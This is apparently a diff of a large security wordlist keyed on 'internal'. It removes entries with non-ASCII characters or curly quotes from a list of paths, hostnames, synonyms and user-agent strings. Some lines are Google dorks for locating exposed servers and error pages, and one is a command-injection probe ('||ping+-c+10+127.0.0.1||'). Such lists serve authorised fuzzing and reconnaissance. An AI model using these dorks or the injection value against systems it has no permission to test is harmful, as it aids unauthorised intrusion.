 giblets,abatis,abdomen,anus,appendix,blind gut,bowels,brain,brains,breast,cecum,chicken foot,chitterlings,cockscomb,colon,dark meat,drumstick,duodenum,foregut,gizzard,guts,haslet,heart,hindgut,innards,inner mechanism,insides,internals,intestine,inwards,jejunum,kidney,kidneys,kishkes,large intestine,leg,liver,liver and lights,lung,marrow,midgut,neck,oyster,perineum,pump,pylorus,rectum,small intestine,spleen,stomach,sweetbread,thigh,ticker,tongue,tripe,tripes,turkey foot,vermiform appendix,viscera,vitals,white meat,wing,wishbone,works
 gic_internal.h
 gimcsinternal
@@ -25567,18 +25545,12 @@ internalistas
 internaliste
 internalisten
 internalistisch
-internalisé
-internalisée
-internalisées
-internalisés
 internalit
 internalitemid
 internalities
 internality
-internalité
 internaliut
 internaliza
-internalización
 internalizacja
 internalizacje
 internalizada
@@ -25595,8 +25567,6 @@ internalization
 internalization's
 internalizationlogic.java
 internalizations
-internalização
-internalizações
 internalize
 internalize-v.xml
 internalize.cpp
@@ -26892,7 +26862,6 @@ intimately,agreeably,amiably,amicably,ardently,arm in arm,centrally,congenially,
 intinternal
 intitle:"500 internal server error" "server at"
 intitle:"ilo: localhost" + "firmware version"
-intitle:”500 internal server error” “server at”
 intl/ar/analytics/the_internal_macroeconomic_statistics_put_pressure_on_the_aussie
 intl/ar/faq/1238_when_are_internal_transfers_not_available
 intl/ar/faq/1239_how_do_i_withdraw_funds_from_the_trading_account_if_the_deposit_was_carried_by_an_internal_transfer
@@ -37637,7 +37606,6 @@ mozilla/5.0 (linux; android 4.4.2; co7000 build/kot49h) applewebkit/537.36 (khtm
 mozilla/5.0 (linux; android 4.4.2; colors x114 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
 mozilla/5.0 (linux; android 4.4.2; colortab  7" build/kvt49l) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
 mozilla/5.0 (linux; android 4.4.2; colortab 7 build/kvt49l) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
-mozilla/5.0 (linux; android 4.4.2; colortab 9” build/kvt49l) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
 mozilla/5.0 (linux; android 4.4.2; combo2 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
 mozilla/5.0 (linux; android 4.4.2; comet build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
 mozilla/5.0 (linux; android 4.4.2; connect502 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
@@ -38915,7 +38883,6 @@ mozilla/5.0 (linux; android 4.4.2; lenovo a5500-f build/kot49h) applewebkit/537.
 mozilla/5.0 (linux; android 4.4.2; lenovo a5500-f build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36 ucbrowser/3.0.0.357
 mozilla/5.0 (linux; android 4.4.2; lenovo a5500-h build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
 mozilla/5.0 (linux; android 4.4.2; lenovo a5500-hv build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
-mozilla/5.0 (linux; android 4.4.2; lenovo a5500-hv فارسی توسط انجمن پارس جی اس ام build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
 mozilla/5.0 (linux; android 4.4.2; lenovo a606 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
 mozilla/5.0 (linux; android 4.4.2; lenovo a606 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36 acheetahi/2100502044
 mozilla/5.0 (linux; android 4.4.2; lenovo a7600-f build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
@@ -38969,7 +38936,6 @@ mozilla/5.0 (linux; android 4.4.2; lenovo x2-ap build/kot49h) applewebkit/537.36
 mozilla/5.0 (linux; android 4.4.2; lenovo-a101 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
 mozilla/5.0 (linux; android 4.4.2; lenovoa3300-gv build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
 mozilla/5.0 (linux; android 4.4.2; lenovoa3300-gv build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36 ucbrowser/3.1.0.403
-mozilla/5.0 (linux; android 4.4.2; lenovoa3300-gv فول فارسی توسط افشین نجفی build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
 mozilla/5.0 (linux; android 4.4.2; lenovoa3300-h build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
 mozilla/5.0 (linux; android 4.4.2; lenovoa3300-hv build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
 mozilla/5.0 (linux; android 4.4.2; lenovoa3300-hv build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36 acheetahi/2100501074
@@ -39751,8 +39717,6 @@ mozilla/5.0 (linux; android 4.4.2; p6-u06 build/huaweip6-u06) applewebkit/537.36
 mozilla/5.0 (linux; android 4.4.2; p7 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
 mozilla/5.0 (linux; android 4.4.2; p706 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
 mozilla/5.0 (linux; android 4.4.2; p709m build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
-mozilla/5.0 (linux; android 4.4.2; p78hd四核(c4a5) build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
-mozilla/5.0 (linux; android 4.4.2; p78hd四核(c4a5) build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36 acheetahi/2100502020
 mozilla/5.0 (linux; android 4.4.2; p8 build/android4.4.2) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
 mozilla/5.0 (linux; android 4.4.2; p8 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
 mozilla/5.0 (linux; android 4.4.2; p80 3g build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
@@ -40871,7 +40835,6 @@ mozilla/5.0 (linux; android 4.4.2; t93q build/kvt49l) applewebkit/537.36 (khtml,
 mozilla/5.0 (linux; android 4.4.2; t9x build/kvt49l) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
 mozilla/5.0 (linux; android 4.4.2; ta721a build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
 mozilla/5.0 (linux; android 4.4.2; tab a732 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
-mozilla/5.0 (linux; android 4.4.2; tab lite Ⅲ build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
 mozilla/5.0 (linux; android 4.4.2; tab-05 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
 mozilla/5.0 (linux; android 4.4.2; tab-7270k build/kvt49l) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
 mozilla/5.0 (linux; android 4.4.2; tab-7800q build/kvt49l) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 safari/537.36
@@ -41246,8 +41209,6 @@ mozilla/5.0 (linux; android 4.4.2; x2_soul build/kot49h) applewebkit/537.36 (kht
 mozilla/5.0 (linux; android 4.4.2; x301 - locked to life wireless build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
 mozilla/5.0 (linux; android 4.4.2; x301 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
 mozilla/5.0 (linux; android 4.4.2; x325 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
-mozilla/5.0 (linux; android 4.4.2; x325 – locked to life wireless build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
-mozilla/5.0 (linux; android 4.4.2; x325–locked to life wireless build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
 mozilla/5.0 (linux; android 4.4.2; x350 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
 mozilla/5.0 (linux; android 4.4.2; x4 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
 mozilla/5.0 (linux; android 4.4.2; x4.5 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0 mobile safari/537.36
@@ -50518,7 +50479,6 @@ soak-dma-edge-vm1-internal-signaling
 soap-localhost
 soap.internal-api
 soaprointernal
-socal district attorney made racist comments discussing black man’s case: internal memos
 social.internalcomments.css
 socialized medicine,adc,medicaid,medicare,aerospace medicine,biomedicine,clinical medicine,comparative medicine,constitutional medicine,cradle-to-grave security,dosimetric medicine,experimental medicine,guaranteed annual income,guaranteed income,health insurance,internal medicine,leechcraft,leechdom,legal medicine,materia medica,medical jurisprudence,medicine,military medicine,naval medicine,neo-hippocratic medicine,old-age assistance,physic,physical medicine,preclinical medicine,preventive medicine,psychosomatic medicine,public assistance,public health medicine,relief,sickness insurance,social insurance,social security,social welfare,space medicine,state medicine,therapy,tropical medicine,unemployment compensation,unemployment insurance,veterinary medicine,welfare,welfare capitalism,welfare payments,welfare state,welfare statism,welfarism,womb-to-tomb security
 socrates.internal
@@ -53252,7 +53212,6 @@ testing-internal/src/main/webapp/echo_post.jsp
 testing-internal/src/main/webapp/index.jsp
 testing-internal/src/main/webapp/large.jsp
 testing-internal/src/main/webapp/query_string.jsp
-testing-internal/src/main/webapp/日本語/index.jsp
 testing.internal
 testing_internal.dart
 testing_internal.ts
@@ -58221,5 +58180,3 @@ zval_internal_ptr_dtor.xml
 ||pandasecurity.s3.amazonaws.com/promotions/$domain=pandasecurity.com
 ||ping+-c+10+127.0.0.1||
 ||s3.amazonaws.com
-“detected an internal error [ibm][cli driver][db2/6000]”
-“internal server error” “server at”
